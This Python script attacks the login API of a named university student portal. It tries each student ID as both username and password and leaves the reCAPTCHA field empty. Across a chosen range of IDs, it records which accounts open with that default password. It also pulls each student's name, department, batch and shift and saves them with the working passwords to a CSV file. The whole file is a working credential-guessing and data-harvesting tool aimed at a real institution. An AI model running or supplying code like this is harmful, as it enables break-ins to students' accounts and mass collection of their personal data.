import csv
import requests

def check(payload, csv_writer):
    headers = {
        "Content-Type": "application/json",
        "Origin": "http://studentportal.diu.edu.bd",
        "Referer": "http://studentportal.diu.edu.bd/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    }
    url_login = "http://software.diu.edu.bd:8006/login"
    url_info = "http://software.diu.edu.bd:8006/result/studentInfo"
    
    try:
        response_login = requests.post(url_login, json=payload, headers=headers)
        data_login = response_login.json()
        params = {"studentId": payload["password"]}
        response_info = requests.get(url_info, headers=headers, params=params)
        data_info = response_info.json()
        
        if data_login["message"] == "success":
          
            
            row = [
                data_info["name"],
                data_info["studentId"],
                payload["password"],  # Student Portal Password
                data_info["department"],
                data_info["batch"],
                data_info["shift"],
                "Success"  # Adding a status column
            ]
            csv_writer.writerow(row)
        else:
            row = [
                data_info["name"],
                data_info["studentId"],
                "",  # Empty password if login failed
                data_info["department"],
                data_info["batch"],
                data_info["shift"],
                "Failed"  # Adding a status column
            ]
            csv_writer.writerow(row)

    except Exception as e:
        row = [
            payload["username"],
            "",
            "",
            "",
            "",
            "",
            f"Error: {e}"  # Adding a status column with error message
        ]
        csv_writer.writerow(row)

def main():
    choice = int(input("Enter '1' for a single search or '2' for a range-based search: "))

    with open('student_data.csv', mode='w', newline='') as file:
        csv_writer = csv.writer(file)
        csv_writer.writerow(["Name", "Student ID", "Student Portal Password", "Department", "Batch", "Shift", "Status"])

        if choice == 1:
            Id = input("Please enter the ID: ")
            payload = {
                "username": f"{Id}",
                "password": f"{Id}",
                "grecaptcha": ""
            }
            check(payload, csv_writer)
        elif choice == 2:
            Batch_code = input("Please enter the Batch Code: ")
            Dept_code = input("Please enter the Department Code: ")
            id_range_lower_bound = input("Please enter the Lower Bound ID: ")
            id_range_upper_bound = input("Please enter the Upper Bound ID: ")
            print("\nProcessing range-based search...")
            for id in range(int(id_range_lower_bound), int(id_range_upper_bound) + 1):
                payload = {
                    "username": f"{Batch_code}-{Dept_code}-{str(id)}",
                    "password": f"{Batch_code}-{Dept_code}-{str(id)}",
                    "grecaptcha": ""
                }
                check(payload, csv_writer)

if __name__ == "__main__":
    main()
